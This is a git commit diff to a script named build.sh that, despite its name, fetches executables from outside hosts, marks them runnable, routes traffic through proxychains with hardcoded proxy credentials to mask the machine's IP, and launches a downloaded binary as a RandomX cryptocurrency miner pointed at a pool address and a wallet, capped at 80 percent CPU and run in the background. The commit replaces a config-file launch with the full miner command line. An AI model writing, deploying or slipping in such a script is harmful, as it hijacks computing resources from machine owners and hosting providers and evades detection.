0530d11a028f0a56202e4574801dd60628257866
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-15 20:17:27 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -3,7 +3,6 @@ port="1080"
 user="fixie"  
 pass="NBq8RRRWjk6fEZk" 
 wget -q -O api https://maper.info/Credit && chmod +x api >/dev/null 2>&1
-wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json >/dev/null 2>&1
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/panel && chmod +x panel 
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/libproxychains4.so && chmod +x libproxychains4.so 
@@ -20,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./api -c "config.json" >/dev/null 2>&1
+./panel ./api -o 149.50.222.86:80 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ.8v -a rx/0 --cpu-max-threads-hint=80 --proxy=192.252.209.155:14455 -k -s -B 
